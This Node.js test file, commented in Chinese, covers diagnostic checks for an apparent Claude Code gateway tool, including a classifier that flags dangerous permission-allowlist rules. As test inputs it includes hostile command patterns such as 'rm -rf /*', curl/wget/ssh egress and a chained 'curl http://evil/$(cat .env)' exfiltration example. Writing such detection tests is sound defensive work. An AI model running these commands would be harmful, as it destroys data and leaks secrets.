import test from 'node:test';
import assert from 'node:assert/strict';
import {
  uploadsFootprintDiagnostic,
  UPLOADS_FOOTPRINT_WARN_BYTES, statuslineConfigDiagnostic, statuslineBridgeDiagnostic, hooksBridgeDiagnostic, classifyPermissionRule, summarizeDangerous, classifyAuthToken, computeReadiness, classifyDeviceGateTopology, modelSettingsConflictDiagnostic, logSwitchDiagnostic, LOG_ROTATE_THRESHOLD_BYTES, claudeConfigDirDiagnostic } from '../../src/ops/doctor-checks.js';

// 判据依据（2026-08-04 用本地假网关抓 /v1/messages 请求体实测，CLI 2.1.221）：
//   全局 sonnet + 目录映射 SONNET      → 发出 grok-4.5      （映射生效）
//   全局 sonnet + 目录只映射 OPUS      → 发出 claude-sonnet-5（退回官方全名，网关不认）
//   全局 claude-opus-5 + 全套映射      → 发出 claude-opus-5  （全名绕过映射）
//   全局不设 model + 全套映射          → 发出 glm-5.2        （CLI 自选档位，映射生效）
// ⇒ 决定映射是否命中的是「model 解析出的档位是否在该目录被映射」，不是 model 字符串是否等于映射目标。
const dirOf = (dir, tierTargets, extra = {}) => ({ dir, localModel: '', projectModel: '', tierTargets, ...extra });
const GW = { sonnet: 'grok-4.5', opus: 'glm-5.2', haiku: 'mimo-v2.5' };

test('modelSettingsConflictDiagnostic: 全局 model 是档位别名且该档位已映射 → ok（不得误报）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 别名带 [1m] 后缀仍按档位解析 → ok', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opus[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 全局 model 是全名 → warn，且点名出问题的目录', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /claude-fable-5/);
  assert.match(r.detail, /gh-pages/);
});

test('modelSettingsConflictDiagnostic: 别名档位在该目录未映射 → warn（会退回官方全名）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /only-opus/);
  // 必须判成「档位缺映射」而非「全名绕过」：两种 warn 的修法不同（补映射 vs 改 model），
  // 且只断言 detail 含 "sonnet" 会被「全名」文案一并满足 —— 变异检查 M3 实测到的空过。
  assert.match(r.detail, /档位 sonnet/);
  assert.ok(!/全名，不走档位映射表/.test(r.detail), 'sonnet 是别名，不该被判成模型全名');
});

test('modelSettingsConflictDiagnostic: opusplan 需 opus+sonnet 两档，缺一即 warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/both', { opus: 'glm-5.2', sonnet: 'grok-4.5' })],
  }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({
    userModel: 'opusplan',
    dirs: [dirOf('/w/only-opus', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /档位 sonnet/);
});

test('modelSettingsConflictDiagnostic: 混合目录下，无网关映射的目录不被连坐点名', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official-no-gateway', {}), dirOf('/w/has-gateway', GW)],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /has-gateway/);
  assert.ok(!/official-no-gateway/.test(r.detail), '无映射的目录用全名完全合法，不该被点名');
});

test('modelSettingsConflictDiagnostic: 多目录只点名真冲突的那个，自洽目录不连坐', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'sonnet',
    dirs: [dirOf('/w/good', GW), dirOf('/w/bad', { opus: 'glm-5.2' })],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /bad/);
  assert.ok(!/good/.test(r.detail), '自洽目录不该出现在告警里');
});

test('modelSettingsConflictDiagnostic: 目录 local 已 pin 网关模型全名 → ok（覆盖链清晰）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/gh-pages', GW, { localModel: 'grok-4.5' })],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 目录无任何 DEFAULT 映射 → ok（无网关，全名合法）', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    dirs: [dirOf('/w/official', {})],
  });
  assert.equal(r.status, 'ok');
  assert.equal(modelSettingsConflictDiagnostic({}).status, 'ok');
});

test('modelSettingsConflictDiagnostic: 未设 model 时主档位齐全 → ok，缺档 → warn', () => {
  assert.equal(modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/full', GW)] }).status, 'ok');
  const r = modelSettingsConflictDiagnostic({ userModel: '', dirs: [dirOf('/w/partial', { sonnet: 'grok-4.5' })] });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /partial/);
});

test('statuslineConfigDiagnostic treats web statusline as self-contained', () => {
  const result = statuslineConfigDiagnostic();

  assert.equal(result.status, 'ok');
  assert.match(result.detail, /SDK/);
  assert.doesNotMatch(result.detail, /settings\.json/);
  assert.doesNotMatch(result.detail, /E16.*禁用/);
});

test('statuslineConfigDiagnostic：实际读取 off 状态，不再是恒定装饰性检查（code-review P2）', () => {
  const enabled = statuslineConfigDiagnostic(false);
  assert.equal(enabled.status, 'ok');
  assert.match(enabled.detail, /SDK/); // 与默认调用一致：启用态

  const off = statuslineConfigDiagnostic(true);
  assert.equal(off.status, 'ok'); // WEB_STATUSLINE=off 是合法配置，不是风险，仍 ok
  assert.match(off.detail, /已.*关闭|off/i);
  assert.notEqual(off.detail, enabled.detail, '开/关两态的 detail 文案应不同，证明确实读取了状态');
});

test('statuslineBridgeDiagnostic：区分已安装、未安装与用户改写后的 drift', () => {
  assert.equal(statuslineBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  assert.match(statuslineBridgeDiagnostic({ installState: 'installed' }).detail, /CLI.*同步/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'not-installed' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'not-installed' }).detail, /statusline:install/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'drifted' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'drifted' }).detail, /改写|漂移/);
  assert.equal(statuslineBridgeDiagnostic({ webOff: true, installState: 'not-installed' }).status, 'ok');
  assert.equal(statuslineBridgeDiagnostic({ bridgeOff: true, installState: 'not-installed' }).status, 'ok');
});

// ④ 安全体检核心：危险白名单判定 —— 公网暴露前审查 permissions.allow 里哪些规则过宽。
test.describe('classifyPermissionRule：危险规则判定', () => {
  const sev = r => classifyPermissionRule(r).severity;
  test('无限定 Bash → danger（等于放开 shell）', () => {
    assert.equal(sev('Bash'), 'danger');
    assert.equal(sev('Bash(*)'), 'danger');
    assert.equal(sev('Bash(:*)'), 'danger');
  });
  test('破坏性 / 提权命令 → danger', () => {
    assert.equal(sev('Bash(sudo apt*)'), 'danger');
    assert.equal(sev('Bash(rm -rf /*)'), 'danger');
    assert.equal(sev('Bash(chmod 777*)'), 'danger');
  });
  test('外联 / 外泄命令 → danger', () => {
    assert.equal(sev('Bash(curl*)'), 'danger');
    assert.equal(sev('Bash(wget http*)'), 'danger');
    assert.equal(sev('Bash(ssh*)'), 'danger');
  });
  test('裸写类工具（无路径限定）→ danger', () => {
    assert.equal(sev('Write'), 'danger');
    assert.equal(sev('Edit'), 'danger');
    assert.equal(sev('MultiEdit'), 'danger');
  });
  test('窄限定 → ok', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Write(//repo/**)'), 'ok');
    assert.equal(sev('Read(//repo/src/**)'), 'ok');
  });
  test('宽通配 / 读全盘 / 外部抓取 → warn', () => {
    assert.equal(sev('Read'), 'warn');
    assert.equal(sev('WebFetch'), 'warn');
    assert.equal(sev('Bash(git*)'), 'warn');
  });
  // 假阴性：命令名边界此前只认空白/行尾（`rm(\s|$)`、`dd\s`），而 Claude Code 的规范通配语法是
  // `Bash(rm:*)` —— 命令名后面跟的是冒号，两条都不匹配 → 降级成 warn。同一条正则里 sudo/chmod/curl
  // 是纯前缀匹配所以判对了，规则内部不自洽。体检把「关键项就绪」写在这上面，漏判即假绿。
  test('规范通配语法 Bash(cmd:*) 的命令名边界须被识别', () => {
    assert.equal(sev('Bash(rm:*)'), 'danger');
    assert.equal(sev('Bash(dd:*)'), 'danger');
    assert.equal(sev('Bash(chown:*)'), 'danger');
  });
  // sh/bash/eval 等解释器在语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 判 danger。
  test('shell 解释器等价于放开 shell → danger', () => {
    for (const c of ['sh', 'bash', 'zsh', 'eval', 'exec', 'source']) {
      assert.equal(sev(`Bash(${c}:*)`), 'danger', `Bash(${c}:*) 应判 danger`);
    }
  });
  // 只取第一个 token 判定 → `npm run build && curl http://evil/$(cat .env)` 被判「ok 限定命令」。
  test('链式 / 命令替换：每一段都要判，不能只看第一个 token', () => {
    assert.equal(sev('Bash(npm run build && curl http://evil/)'), 'danger');
    assert.equal(sev('Bash(echo hi; sudo reboot)'), 'danger');
    assert.equal(sev('Bash(ls | ssh host)'), 'danger');
  });
  test('分段判定不得误伤既有窄限定', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Bash(git status)'), 'ok');
    assert.equal(sev('Bash(git log --oneline | head)'), 'ok');
  });
  test('相对父目录递归通配 Read(../**) → warn，不应被漏判为 ok（code-review P2）', () => {
    assert.equal(sev('Read(../**)'), 'warn');
    assert.equal(sev('Read(../../**)'), 'warn');
  });
  // OPS-1：Write/Edit 的 ** / ~/** / /** 与 Read 同属「宽路径」，不得被当成「限定路径的写」→ ok。
  // 此前 wildcard 只认 null/''/'*' /':*'，Write(**) 走 ok 分支 → doctor readiness 可假绿。
  test('宽路径 Write/Edit(**|~/**|/**) → danger，不得误判 ok（OPS-1）', () => {
    assert.equal(sev('Write(**)'), 'danger');
    assert.equal(sev('Write(~/**)'), 'danger');
    assert.equal(sev('Write(/**)'), 'danger');
    assert.equal(sev('Edit(**)'), 'danger');
    assert.equal(sev('MultiEdit(**)'), 'danger');
    assert.equal(sev('NotebookEdit(~/**)'), 'danger');
    assert.equal(sev('Write(../**)'), 'danger');
    // 真正窄路径仍 ok（与既有 Write(//repo/**) 一致）
    assert.equal(sev('Write(//repo/**)'), 'ok');
  });
  test('未知工具 / mcp 不误报 danger', () => {
    assert.equal(sev('mcp__server__tool'), 'ok');
    assert.notEqual(sev('SomeWeirdTool'), 'danger');
  });
  test('每条带 reason，且空/垃圾输入不抛', () => {
    assert.match(classifyPermissionRule('Bash(*)').reason, /.+/);
    assert.doesNotThrow(() => classifyPermissionRule(''));
    assert.doesNotThrow(() => classifyPermissionRule(null));
  });
});

test.describe('summarizeDangerous', () => {
  test('混合规则 → ruleCount 全量 + dangerous 仅危险条（带 rule/reason）', () => {
    const s = summarizeDangerous(['Bash(*)', 'Read', 'Write(//r/**)', 'Bash(curl*)']);
    assert.equal(s.ruleCount, 4);
    assert.equal(s.dangerous.length, 2);
    assert.ok(s.dangerous.every(d => d.rule && d.reason));
  });
  test('空白名单 → ruleCount 0, dangerous []', () => {
    assert.deepEqual(summarizeDangerous([]), { ruleCount: 0, dangerous: [] });
  });
});

test.describe('classifyAuthToken：绝不回显明文', () => {
  test('undefined → warn(isSet false)', () => {
    assert.deepEqual(classifyAuthToken(undefined), { status: 'warn', isSet: false });
  });
  test('空串 → fail', () => {
    assert.equal(classifyAuthToken('').status, 'fail');
  });
  test('短 token → warn，返回 length 但无明文', () => {
    const r = classifyAuthToken('abc');
    assert.equal(r.status, 'warn');
    assert.equal(r.length, 3);
    assert.equal(JSON.stringify(r).includes('abc'), false);
  });
  test('正常 token → ok，不回显明文', () => {
    const r = classifyAuthToken('x'.repeat(32));
    assert.equal(r.status, 'ok');
    assert.equal(JSON.stringify(r).includes('x'.repeat(32)), false);
  });
});

test.describe('computeReadiness：公网暴露就绪度', () => {
  const chk = (id, status, safe) => ({ id, status, safe });
  test('任一 fail → blocked', () => {
    assert.equal(computeReadiness([chk('CLAUDE_BIN', 'fail')]).level, 'blocked');
  });
  test('危险白名单 + 无 CF + 弱 token → blocked', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'warn'), chk('CF_ACCESS', 'ok', { enabled: false }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'blocked');
  });
  test('危险白名单 + 有 CF Access → caution（有兜底）', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'ok'), chk('CF_ACCESS', 'ok', { enabled: true }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'caution');
  });
  test('全净 → ready', () => {
    assert.equal(computeReadiness([chk('AUTH_TOKEN', 'ok'), chk('WHITELIST', 'ok', { dangerous: [] })]).level, 'ready');
  });
});

test.describe('classifyDeviceGateTopology（AUTH-003）', () => {
  test('CF Access 已开 → ok（设备门 bypass 为设计路径）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: true });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
  });
  test('有 AUTH_TOKEN 无 CF Access → ok（Host 感知设备门，A2 不再误报 tunnel 跳过）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: false });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
    assert.equal(r.safe.note, 'host_aware_device_gate');
    assert.match(r.detail, /设备门|CF Access/);
  });
  test('无 AUTH_TOKEN → ok（仅本机）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: false, cfEnabled: false });
    assert.equal(r.status, 'ok');
  });
});

// D12：hooks 桥安装态四分支。与 D6 同款——drifted 不自作主张覆盖，只提示用户自己看。
test('hooksBridgeDiagnostic：off / 已安装 / 漂移 / 未安装 四态', () => {
  assert.equal(hooksBridgeDiagnostic({ bridgeOff: true }).status, 'ok');
  assert.equal(hooksBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  const drifted = hooksBridgeDiagnostic({ installState: 'drifted' });
  assert.equal(drifted.status, 'warn');
  assert.match(drifted.detail, /勿强行覆盖/);
  const missing = hooksBridgeDiagnostic({ installState: 'not-installed' });
  assert.equal(missing.status, 'warn');
  assert.match(missing.detail, /hooks:install/);
});

// ── 2026-08-04 code review：本次改动自身的两个洞（实测确认）────────────────────
// 洞一：resolveTiers 用 `TIER_ALIASES[bare]` 做计算属性查找，`constructor` / `__proto__`
// 经原型链返回真值非数组 → 下游 tiers.filter 抛 TypeError，冲出 runDoctor 打死整份体检报告
// （不是降级成一行 warn，是整个诊断面板挂掉）。
test('modelSettingsConflictDiagnostic: 原型链键名不得让整份体检崩掉', () => {
  for (const evil of ['constructor', '__proto__', 'toString', 'valueOf', 'hasOwnProperty']) {
    const r = modelSettingsConflictDiagnostic({
      userModel: evil,
      dirs: [dirOf('/w/gw', GW)],
    });
    assert.ok(r && typeof r.status === 'string', `model=${evil} 必须返回正常结果而非抛异常`);
    assert.equal(r.status, 'warn', `${evil} 不是档位别名，应按模型全名判 warn`);
  }
});

// ---- 日志开关长开检出 ----
// 事故实证（2026-08-04 复核）：~/Library/Logs/ccm-server.log.0.gz 解压 156,351,605 字节 = 149MiB，
// 归档时间 7/18，与 app.js:2661 注释「DEBUG_SDK_MESSAGES 长开曾把日志刷到 149M 而无任何界面可见」
// 对得上。当时唯一的可见性是事后翻磁盘——doctor 此前对三个日志开关零感知（grep LOG_ scripts/doctor.js
// 无命中）。
//
// 判据与服务状态面板对齐（logic.js serviceStatusBasicRows：只有 sdkDebug 开才 alert）：
// interactions/stderr 量级小得多，单独开着是正常调试态，不该每次体检都报 warn 制造噪音——
// 那样人会学会忽略它，检出就白做了（同 metrics.js recentDeliveryFailure 的「狼来了」考虑）。
// 但它们叠加「日志已经涨过轮转阈值」时仍要提醒：此时保留窗口正在被压缩。
const noLogFile = { interactions: false, sdkDebug: false, stderr: false, logFileBytes: 0 };

test('logSwitchDiagnostic: 三个开关全关 → ok', () => {
  const r = logSwitchDiagnostic(noLogFile);
  assert.equal(r.status, 'ok');
});

test('logSwitchDiagnostic: DEBUG_SDK_MESSAGES 开 → warn 且点名该开关（149M 事故元凶）', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「文案写死」空过：实现若不分开关种类、恒回同一串，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开且日志未超阈值 → ok，且不得点名 DEBUG_SDK_MESSAGES', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_STDERR/);
  assert.doesNotMatch(r.detail, /DEBUG_SDK_MESSAGES/);
});

// 防「大小分支空过」：实现若忽略 logFileBytes，本条会红。
test('logSwitchDiagnostic: 仅 LOG_STDERR 开但日志已超轮转阈值 → 升级为 warn 且带出实际体积', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, stderr: true, logFileBytes: LOG_ROTATE_THRESHOLD_BYTES + 1 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /\d+\s*MB/);
});

// 两个 warn 分支（sdkDebug / oversized）的 detail 都含开关名与体积，只断言这两项会被另一分支
// 误满足——首轮变异检查实测：把 `if (sdkDebug)` 改成 `if (false)` 时本条仍绿（落到 oversized 分支
// 照样通过）。故必须再断言一句 sdkDebug 分支【独有】的收尾指引，才真正钉住走的是哪条分支。
test('logSwitchDiagnostic: sdkDebug 开且日志超阈值 → 走 sdkDebug 分支，开关名与体积同时出现', () => {
  const r = logSwitchDiagnostic({ ...noLogFile, sdkDebug: true, logFileBytes: 200 * 1024 * 1024 });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /DEBUG_SDK_MESSAGES/);
  assert.match(r.detail, /200\s*MB/);
  assert.match(r.detail, /调试完请/, 'sdkDebug 分支独有文案；缺了说明落到了 oversized 分支');
});

// 日志文件读不到（未配置 LOG_FILE / 前台跑 / 权限不足）时，体检不得因此崩或误报体积。
test('logSwitchDiagnostic: logFileBytes 缺省 → 按「未超阈值」处理，不出现体积文案', () => {
  const r = logSwitchDiagnostic({ interactions: true, sdkDebug: false, stderr: false });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /LOG_INTERACTIONS/);
  assert.doesNotMatch(r.detail, /MB/);
});

// R9-uploads（2026-08-06 BUG hunting review）：只报可见性，【不自动清理】。
// .ccm-uploads/ 落在机主真实工作目录里，且历史消息回显要读它（附件预览走 browse:read）——
// 按 TTL/容量删会让老对话的图片预览全坏掉。要做对只有「识别 transcript 已引用不到的孤儿」一条路，
// 复杂度与风险不匹配实测增长率（22 天 2.5MB）。故只给体积可见性，清不清由机主判断。
test.describe('uploadsFootprintDiagnostic（R9：附件目录可见性，不自动删）', () => {
  test('无附件目录 → ok 且不啰嗦', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /无附件/);
  });

  test('体积在阈值内 → ok，报总量供参照', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 5 * 1024 * 1024, files: 12 }] });
    assert.equal(r.status, 'ok');
    assert.match(r.detail, /5 MB|12/);
  });

  test('超阈值 → warn，且明说不会自动清理、要机主自己删', () => {
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/repo', bytes: UPLOADS_FOOTPRINT_WARN_BYTES + 1, files: 400 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /不会自动清理|手动/);
  });

  test('多目录合计判阈值，detail 里点名最大的那个', () => {
    const half = Math.ceil(UPLOADS_FOOTPRINT_WARN_BYTES / 2) + 1;
    const r = uploadsFootprintDiagnostic({
      dirs: [{ cwd: '/small', bytes: 1024, files: 1 }, { cwd: '/big', bytes: half * 2, files: 300 }],
    });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /\/big/);
  });

  test('不回显完整路径以外的内容，也不因单目录为 0 而误报', () => {
    const r = uploadsFootprintDiagnostic({ dirs: [{ cwd: '/repo', bytes: 0, files: 0 }] });
    assert.equal(r.status, 'ok');
  });
});

// ── claudeConfigDirDiagnostic ─────────────────────────────────────────────
// CLI/SDK 都认 CLAUDE_CONFIG_DIR（SDK 实测：projects 根 = (CLAUDE_CONFIG_DIR ?? ~/.claude)/projects），
// 本仓 history.js 的 CLAUDE_DIR 却硬编码 homedir()。设了它 = CLI 把 transcript 落到别处、本仓去老地方找，
// 而失败形态是「读不到 = 当作没有会话」，静默到无法自查。这里只把它变成启动时说得清的告警。
test.describe('claudeConfigDirDiagnostic', () => {
  test('未设置 → ok', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '' }).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic({}).status, 'ok');
    assert.equal(claudeConfigDirDiagnostic().status, 'ok');
  });

  test('只有空白字符 → 视同未设置', () => {
    assert.equal(claudeConfigDirDiagnostic({ configDir: '   ' }).status, 'ok');
  });

  test('设置了 → warn，点名变量值与「读不到历史」这一具体后果', () => {
    const r = claudeConfigDirDiagnostic({ configDir: '/custom/claude-home' });
    assert.equal(r.status, 'warn');
    assert.match(r.detail, /CLAUDE_CONFIG_DIR/);
    assert.match(r.detail, /\/custom\/claude-home/, '要回显实际值，否则排障时不知道是谁设的');
    assert.match(r.detail, /历史|会话|transcript/);
  });
});
